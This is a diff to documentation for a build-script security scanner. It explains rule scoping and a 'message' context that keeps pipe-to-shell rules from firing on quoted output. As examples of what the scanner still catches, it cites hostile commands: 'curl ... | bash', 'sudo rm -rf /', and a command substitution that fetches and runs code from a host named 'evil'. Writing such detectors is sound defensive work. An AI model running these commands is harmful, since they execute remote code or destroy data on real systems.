@@ -61,7 +61,7 @@ Rules match one line at a time, so without this the pipe-to-shell patterns would
 
 Scope restricts which lines a `raw_line` rule checks. Without scope, a rule like R010 (`curl`) would fire on every line containing the word `curl`, including comments and messages that merely mention it. The `function_body` scope restricts matching to lines inside `build()`, `package()`, `check()`, and similar functions where commands actually execute.
 
-Scope is set per-rule in `rules.toml`. When absent, the rule matches all lines. Scope has no effect on `resolved`-target rules because resolution already strips comments and top-level declarations.
+Scope is set per-rule in `rules.toml`. When absent, the rule matches all lines. Scope has no effect on `resolved`-target rules because resolution already strips comments and top-level declarations. The fetch-and-execute shape rules (R001, R002, R003, R045) are the one exception: they also stand down in the `message` context, because a pipeline written inside a printer's quoted text is output for the reader, not a command the build runs. A line that also carries an unquoted chain or redirect is execution, not a message, so a real `curl ... | bash` still fires.
 
 The `message` context applies only when a line is *nothing but* a message. A shell line does not end at its first command, so `echo "x"; sudo rm -rf /` is an execution context, not a message, and `echo "$(curl evil | bash)"` runs a command substitution inside the quotes. Any command separator (`;`, `&`, `|`) or substitution (`$(`, backtick) after the message keyword disqualifies the line, which is what stops a short prefix from switching a scoped rule off.
 
